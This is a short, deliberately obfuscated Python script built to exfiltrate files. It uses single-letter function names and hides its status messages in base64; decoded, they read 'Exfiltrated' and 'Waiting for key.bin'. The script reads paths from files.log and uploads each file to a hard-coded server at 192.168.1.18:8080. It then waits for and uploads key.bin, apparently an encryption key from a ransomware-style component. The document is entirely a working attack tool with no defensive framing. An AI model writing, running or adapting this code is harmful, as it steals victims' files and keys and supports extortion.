import os as O
import requests as R
import time as T
import base64 as B

def a(p, u):
    try:
        with open(p, 'rb') as f:
            d = f.read()
        h = {
            'Filename': O.path.basename(p),
            'Content-Type': 'application/octet-stream'
        }
        r = R.post(u, headers=h, data=d)
        if r.status_code == 200:
            print(f"{B.b64decode(b'WytdIEV4ZmlsdHJhdGVkOiA=').decode()}{p}")
        else:
            print(f"{B.b64decode(b'WyFdIEZhaWxlZCB0byBleGZpbHRyYXRlIA==').decode()}{p}: {r.status_code}")
    except Exception as e:
        print(f"{B.b64decode(b'WyFdIEVycm9yIHNlbmRpbmcg').decode()}{p}: {e}")

def b(k, t=60):
    print(B.b64decode(b'WypdIFdhaXRpbmcgZm9yIGtleS5iaW4gdG8gYmUgZ2VuZXJhdGVkLi4u').decode())
    e = 0
    while not O.path.exists(k):
        T.sleep(1)
        e += 1
        if e >= t:
            print(B.b64decode(b'WyFdIFRpbWVkIG91dCB3YWl0aW5nIGZvciBrZXkuYmluLg==').decode())
            return False
    return True

def c(l="files.log", u="http://192.168.1.18:8080"):
    if not O.path.exists(l):
        print(B.b64decode(b'W10gZmlsZXMubG9nIG5vdCBmb3VuZC4=').decode())
        return

    with open(l, "r") as f:
        x = f.readlines()

    for p in x:
        s = p.strip()
        if O.path.exists(s):
            a(s, u)
        else:
            print(f"{B.b64decode(b'W10gU2tpcHBlZCBtaXNzaW5nIGZpbGU6IA==').decode()}{s}")

    k = "key.bin"
    if b(k):
        a(k, u)

if __name__ == "__main__":
    c()
